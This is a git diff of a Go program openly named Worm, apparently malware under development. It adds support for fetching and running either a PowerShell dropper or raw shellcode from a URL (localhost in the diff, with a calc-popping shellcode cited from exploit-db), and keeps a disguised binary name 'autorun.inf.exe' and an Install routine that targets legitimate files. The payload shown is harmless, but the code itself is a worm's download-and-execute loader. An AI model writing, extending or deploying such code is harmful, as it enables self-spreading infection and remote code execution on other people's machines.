@@ -9,12 +9,19 @@ import (
 	"time"
 )
 
+
 type Worm struct {
 	exePathName string
 	binaryName string
 	maxScanInterval int
-	payloadURL string
+	payloadUrl string
+	payloadType string // `powershell` & `shellcode` are currently supported
 }
+
+/*
+TODO: how can main for example have shared data structures with the subpackages
+which it can use to send them data.
+*/
 
 // Initializes a new worm
 func (w *Worm) Init() {
@@ -41,7 +48,7 @@ func (w Worm) Install(legitFile string) {
 }
 
 func (w Worm) Payload() {
-	payload.Payload(w.payloadURL)
+	payload.Payload(w.payloadUrl, w.payloadType)
 }
 
 func (w Worm) Sleep() {
@@ -54,7 +61,13 @@ func main(){
 	worm := &Worm{
 		binaryName: "autorun.inf.exe", 
 		maxScanInterval: 5,
-		payloadURL: "http://localhost:8005/dropper.ps1",
+		//payloadURL: "http://localhost:8005/dropper.ps1",
+
+		// https://www.exploit-db.com/shellcodes/49819
+		// `payload.bin` is in `payload/payload.bin` sub-directory,
+		// it is raw-binary shellcode that pops calc.exe
+		payloadUrl: "http://localhost:8005/payload.bin",
+		payloadType: "shellcode",
 	}
 	worm.Init()
 
